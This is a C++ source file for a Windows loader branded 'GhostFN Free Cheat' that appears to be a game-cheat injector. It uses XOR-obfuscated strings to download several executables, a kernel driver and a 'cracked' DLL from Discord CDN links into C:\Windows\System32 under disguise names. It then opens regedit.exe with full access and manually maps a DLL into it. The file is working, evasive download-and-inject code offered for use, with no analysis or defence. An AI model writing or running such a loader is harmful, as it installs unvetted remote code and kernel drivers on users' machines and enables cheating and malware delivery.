#include <windows.h>
#include <iostream>
#include <TlHelp32.h>
#include "Injection.h"
#include <Wininet.h>
#include "LazyImporter.h"
#include <Urlmon.h>
#include "XOR.hpp"
#pragma comment (lib, "urlmon.lib")

#ifdef _WIN64
const char szDllFile[] = "C:\\Users\\Sayro\\source\\repos\\ConsoleApplication1\\x64\\Release\\ConsoleApplication1.dll"; //DLL PATH
const char szProc[] = "regedit.exe"; //Don't Touch This
#else
const char szDllFile[] = "C:\\Users\\Sayro\\source\\repos\\ConsoleApplication1\\x64\\Release\\ConsoleApplication1.dll"; //DLL PATH
const char szProc[] = "regedit.exe"; // Also This
#endif|


bool IsCorrectTargetArchitecture(HANDLE hProc)
{
	BOOL bTarget = FALSE;
	if (!IsWow64Process(hProc, &bTarget))
	{
		return false;
	}

	BOOL bHost = FALSE;
	IsWow64Process(GetCurrentProcess(), &bHost);

	return (bTarget == bHost);
}




int main()
{

    system(xorthis("start c:\\windows\\regedit.exe")); //Please Don't Touch This
	SetConsoleTitleA("GhostFN Free Cheat"); //Loader Name
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 11); // Text Color
	printf(xorthis("Connecting..")); //Jusr Design

	//Change This Link to your own injector and drivers and dll
	HRESULT Injector = URLDownloadToFileA(NULL, xorthis("https://cdn.discordapp.com/attachments/868038558663999518/912817369968156723/kdmappernew.exe"), xorthis("C:\\Windows\\System32\\kdmappernew.exe"), 0, NULL); 
	HRESULT Loader = URLDownloadToFileA(NULL, xorthis("https://cdn.discordapp.com/attachments/868038558663999518/912782630288756787/ConsoleApplication1.dll"), xorthis("C:\\Windows\\System32\\svhostfn.dll"), 0, NULL);
	HRESULT Driver = URLDownloadToFileA(NULL, xorthis("https://cdn.discordapp.com/attachments/887073145914286096/912819234420170782/1909_drv.sys"), xorthis("C:\\Windows\\System32\\1909Inj.sys"), 0, NULL);
	HRESULT DLLInject = URLDownloadToFileA(NULL, xorthis("https://cdn.discordapp.com/attachments/887073145914286096/913147418747498506/sexmap.exe"), xorthis("C:\\Windows\\System32\\sexmap.exe"), 0, NULL);
	HRESULT Dll = URLDownloadToFileA(NULL, xorthis("https://cdn.discordapp.com/attachments/887073145914286096/913147487609585684/pasta_cracked.dll"), xorthis("C:\\Windows\\System32\\pasta_cracked.dll"), 0, NULL);
	Sleep(3000);

	//Do not touch this 
	PROCESSENTRY32 PE32{ 0 };
	PE32.dwSize = sizeof(PE32); 

	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap == INVALID_HANDLE_VALUE)
	{
		DWORD Err = GetLastError();
		return 0;
	}

	DWORD PID = 0;
	BOOL bRet = Process32First(hSnap, &PE32);
	while (bRet)
	{
		if (!strcmp(szProc, PE32.szExeFile))
		{
			PID = PE32.th32ProcessID;
			break;
		}
		bRet = Process32Next(hSnap, &PE32);
	}

	CloseHandle(hSnap);

	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (!hProc)
	{
		DWORD Err = GetLastError();
		return 0;
	}

	if (!IsCorrectTargetArchitecture(hProc))
	{
		CloseHandle(hProc);
		return 0;
	}

	if (!ManualMap(hProc, szDllFile))
	{
		CloseHandle(hProc);
		return 0;
	}




	CloseHandle(hProc);

	return 0;
}
